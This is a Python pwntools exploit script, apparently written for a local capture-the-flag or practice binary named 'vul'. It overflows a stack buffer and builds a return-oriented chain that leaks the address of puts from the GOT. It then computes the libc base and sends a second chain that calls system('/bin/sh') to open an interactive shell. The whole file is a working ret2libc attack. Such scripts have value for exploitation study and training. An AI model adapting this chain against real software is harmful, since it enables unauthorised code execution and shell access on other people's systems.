from pwn import *

context.os = 'linux'
context.arch = "amd64"
bin = ELF('./vul')
p = process("./vul")

poprdi_offset = 0x000000000040120b
binsh_offset = 0x1c041b
system_offset = 0x000000000055230
ret = 0x00000000004011a4
main = 0x0000000000401199
puts_plt = 0x0000000000401030
puts_got = 0x0000000000404018

puts_glibc = 0x0000000000835b0

junk = b'A'*216
payload = junk
payload += p64(ret)
payload += p64(poprdi_offset)
payload += p64(puts_got)
payload += p64(puts_plt)
payload += p64(main)

p.sendline(payload)

# print(p.recv())
p.recvline(b'\x0a')
# leak = p.recvlines(2)[1]
# leak_addr = unpack(leak, 'all')
leaked_puts = u64(p.recvline().strip().ljust(8, b'\x00'))
log.success("Address " + hex(leaked_puts))
# print(hex(leaked_puts))

offset = leaked_puts - puts_glibc
# print(hex(offset))
# log.success("Address " + hex(offset))

system = offset + system_offset
binsh = offset + binsh_offset
poprdi = poprdi_offset

payload  = junk
payload += p64(poprdi)
payload += p64(binsh)
payload += p64(ret)
payload += p64(system)
p.sendline(payload)
p.interactive()

# exploit = payload

# with open('exploit', 'wb') as payload:
#     payload.write(exploit)
